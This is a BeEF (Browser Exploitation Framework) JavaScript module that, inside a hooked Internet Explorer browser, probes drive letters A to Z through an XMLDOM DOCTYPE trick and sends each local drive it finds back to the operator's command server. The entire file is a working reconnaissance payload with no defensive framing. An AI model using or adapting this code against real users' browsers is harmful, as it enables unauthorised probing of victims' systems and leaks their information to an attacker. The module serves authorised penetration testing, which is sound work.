//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  if (!("ActiveXObject" in window)) {
    beef.debug('[Detect Users] Unspported browser');
    beef.net.send('<%= @command_url %>', <%= @command_id %>,'fail=unsupported browser', beef.are.status_error());
    return false;
  }

  function detect_drive(drive) {
    var dtd = drive + ':\\';
    var xml = '<?xml version="1.0" ?><!DOCTYPE anything SYSTEM "' + dtd + '">';
    var xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
    xmlDoc.async = true;
    try {
      xmlDoc.loadXML(xml);
      return xmlDoc.parseError.errorCode == 0 ? true : false;
    } catch (e) {
      return true;
    }
  }

  // Detect drives: A - Z
  for (var i = 65; i <= 90; i++) {
    var drive = String.fromCharCode(i);
    beef.debug('[Detect Local Drives] Checking for drive: ' + drive);
    var result = detect_drive(drive);
    if (result) {
      beef.debug('[Detect Local Drives] Found drive: ' + drive);
      beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found drive: ' + drive, beef.are.status_success());
    }
  }

});

